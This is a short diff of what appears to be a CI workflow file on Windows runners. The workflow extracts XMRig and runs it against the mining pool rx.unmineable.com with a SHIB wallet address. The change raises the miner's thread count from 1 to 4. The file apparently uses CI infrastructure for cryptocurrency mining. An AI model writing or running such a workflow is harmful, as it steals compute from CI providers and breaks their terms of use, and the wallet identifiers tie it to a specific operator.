@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive xmrig-6.15.2-msvc-win64.zip
     - name: RUNNING
-      run: .\xmrig-6.15.2-msvc-win64\xmrig-6.15.2\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x49990f1e07e770fcf1d5e581e75d20c2e452e3a6.indehoi#m4rc-2ick -p x -t 1
+      run: .\xmrig-6.15.2-msvc-win64\xmrig-6.15.2\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x49990f1e07e770fcf1d5e581e75d20c2e452e3a6.indehoi#m4rc-2ick -p x -t 4
     - name: DONE
       run: exit
